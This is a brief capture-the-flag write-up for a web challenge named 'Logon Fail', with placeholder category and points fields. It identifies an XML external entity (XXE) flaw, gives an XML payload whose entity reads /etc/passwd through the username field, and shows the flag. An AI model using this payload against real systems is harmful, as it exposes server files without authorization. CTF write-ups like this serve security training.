# CTF Name – Logon Fail

- **Category:** category
- **Points:** points

## Challenge

> I left my partially written app accessible on the Internet...thats not a problem is it?

> (/var/www/flag)

http://logon-xxfail.seekurity.com.au:3002/

## Solution

Vulnerable to xxe

Payload
```
<!--?xml version="1.0" ?-->
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <Request>
  <username>&xxe;</username>
  <password>password</password>
 </Request>
```

```
flag{DTDP@rsing15D@ng3r0u5}
```
